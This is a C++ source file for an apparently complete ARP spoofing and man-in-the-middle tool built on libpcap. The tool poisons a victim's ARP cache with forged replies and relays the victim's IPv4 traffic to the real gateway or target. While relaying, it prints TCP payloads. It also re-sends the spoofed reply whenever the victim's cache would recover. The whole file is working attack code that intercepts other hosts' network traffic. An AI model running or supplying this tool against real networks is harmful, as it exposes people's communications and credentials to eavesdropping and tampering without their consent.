#include "getinfo.h"
#include "hdr/ipv4hdr.h"
#include "hdr/tcphdr.h"

struct targetPair
{
	Ip sender_ip;
	Ip target_ip;
	Mac sender_mac;
	Mac target_mac;
	int packet_count = 0;
};

void usage()
{
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char *argv[])
{
	if (argc < 4 || (argc - 2) % 2 != 0)
	{
		usage();
		return EXIT_FAILURE;
	}

	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr)
	{
		fprintf(stderr, "*Error: Couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	Mac interface_mac = Mac::getMac(dev);
	Ip my_ip = getIp(dev);
	std::vector<targetPair> targets;

	for (int i = 2; i < argc; i += 2)
	{
		const char *sender_ip = argv[i];
		const char *target_ip = argv[i + 1];

		Mac sender_mac = SearchMac(pcap, interface_mac, my_ip, Ip(sender_ip));
		Mac target_mac = SearchMac(pcap, interface_mac, my_ip, Ip(target_ip));

		if (sender_mac == Mac::nullMac() || target_mac == Mac::nullMac())
		{
			printf("Error: Failed to resolve MAC for %s or %s\n", sender_ip, target_ip);
			continue;
		}

		targetPair target = {Ip(sender_ip), Ip(target_ip), sender_mac, target_mac};
		targets.push_back(target);

		EthArpPacket packet;
		packet.eth_.dmac_ = sender_mac;
		packet.eth_.smac_ = interface_mac;
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::Size;
		packet.arp_.pln_ = Ip::Size;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = interface_mac;
		packet.arp_.sip_ = htonl(target.target_ip);
		packet.arp_.tmac_ = sender_mac;
		packet.arp_.tip_ = htonl(target.sender_ip);

		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
		if (res != 0)
		{
			fprintf(stderr, "*Error: Pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
		printf("Info: Successed to ARP spoofing sent for %s -> %s\n", sender_ip, target_ip);
	}

	if (targets.empty())
	{
		printf("Error: No targets\n");
		pcap_close(pcap);
		return EXIT_FAILURE;
	}

	while (true)
	{
		struct pcap_pkthdr *header;
		const u_char *packet;

		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0)
			continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			fprintf(stderr, "*Error: failed to Pcap_next_ex return %d error=%s\n", res, pcap_geterr(pcap));
			break;
		}

		EthHdr *eth_hdr = (EthHdr *)packet;

		for (auto &target : targets)
		{
			if (eth_hdr->smac() == target.sender_mac && eth_hdr->type() == EthHdr::Ip4)
			{
				time_t now = time(0);
				char *timestr = ctime(&now);
				timestr[strlen(timestr) - 1] = '\0';

				printf("\n========[ARP infect #%d from %s]========\n", target.packet_count, std::string(target.sender_ip).c_str());
				printf("Size: %d bytes\n", header->caplen);

				Ipv4Hdr *ip_hdr = (Ipv4Hdr *)(packet + sizeof(EthHdr));
				printf("IPv4 Header:\n");
				printf("  - Protocol: %d (%s)\n", ip_hdr->protocol(),
					   ip_hdr->protocol() == Ipv4Hdr::Tcp ? "TCP" : ip_hdr->protocol() == Ipv4Hdr::Udp ? "UDP"
																: ip_hdr->protocol() == Ipv4Hdr::Icmp  ? "ICMP"
																									   : "Other");
				printf("  - Source IP: %s\n", std::string(ip_hdr->sip()).c_str());
				printf("  - Destination IP: %s\n", std::string(ip_hdr->dip()).c_str());
				printf("  - Total Length: %d bytes\n", ip_hdr->total_length());

				if (ip_hdr->protocol() == Ipv4Hdr::Tcp)
				{
					Tcp4Hdr *tcp_hdr = (Tcp4Hdr *)(packet + sizeof(EthHdr) + (ip_hdr->ihl_ * 4));
					printf("TCP Header:\n");
					printf("  - Source Port: %d\n", tcp_hdr->sport());
					printf("  - Destination Port: %d\n", tcp_hdr->dport());

					int tcp_header_len = tcp_hdr->data_offset_ * 4;
					int ip_header_len = ip_hdr->ihl_ * 4;
					int payload_len = ip_hdr->total_length() - ip_header_len - tcp_header_len;

					if (payload_len > 0)
					{
						const u_char *payload = packet + sizeof(EthHdr) + ip_header_len + tcp_header_len;
						printf("TCP Payload (%d bytes):\n", payload_len);

						for (int i = 0; i < payload_len && i < 100; i++)
						{
							if (payload[i] >= 32 && payload[i] <= 126)
							{
								printf("%c", payload[i]);
							}
							else
							{
								printf(".");
							}
							if ((i + 1) % 50 == 0)
								printf("\n");
						}
						if (payload_len > 0)
							printf("\n");
					}
				}
				printf("========================================\n");

				Mac backup_dmac = eth_hdr->dmac_;
				Mac backup_smac = eth_hdr->smac_;

				eth_hdr->dmac_ = target.target_mac;
				eth_hdr->smac_ = interface_mac;

				int send_res = pcap_sendpacket(pcap, packet, header->caplen);
				if (send_res != 0)
				{
					fprintf(stderr, "*Error: packet: %s\n", pcap_geterr(pcap));
				}
				else
				{
					target.packet_count++;
				}

				eth_hdr->dmac_ = backup_dmac;
				eth_hdr->smac_ = backup_smac;
			}
		}

		if (eth_hdr->type() == EthHdr::Arp)
		{
			ArpHdr *arp_hdr = (ArpHdr *)(packet + sizeof(EthHdr));

			for (auto &target : targets)
			{
				if (ntohs(arp_hdr->op_) == ArpHdr::Reply && ntohl(arp_hdr->sip_) == target.sender_ip && arp_hdr->smac_ == target.sender_mac)
				{
					EthArpPacket spoof_packet;
					spoof_packet.eth_.dmac_ = target.sender_mac;
					spoof_packet.eth_.smac_ = interface_mac;
					spoof_packet.eth_.type_ = htons(EthHdr::Arp);

					spoof_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
					spoof_packet.arp_.pro_ = htons(EthHdr::Ip4);
					spoof_packet.arp_.hln_ = Mac::Size;
					spoof_packet.arp_.pln_ = Ip::Size;
					spoof_packet.arp_.op_ = htons(ArpHdr::Reply);
					spoof_packet.arp_.smac_ = interface_mac;
					spoof_packet.arp_.sip_ = htonl(target.target_ip);
					spoof_packet.arp_.tmac_ = target.sender_mac;
					spoof_packet.arp_.tip_ = htonl(target.sender_ip);

					int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&spoof_packet), sizeof(EthArpPacket));
					if (res != 0)
					{
						fprintf(stderr, "*Error: Pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
					}
					printf("Info: Re-spoofed ARP table for %s -> %s\n",
						   std::string(target.sender_ip).c_str(),
						   std::string(target.target_ip).c_str());
				}
			}
		}
	}
	pcap_close(pcap);
}
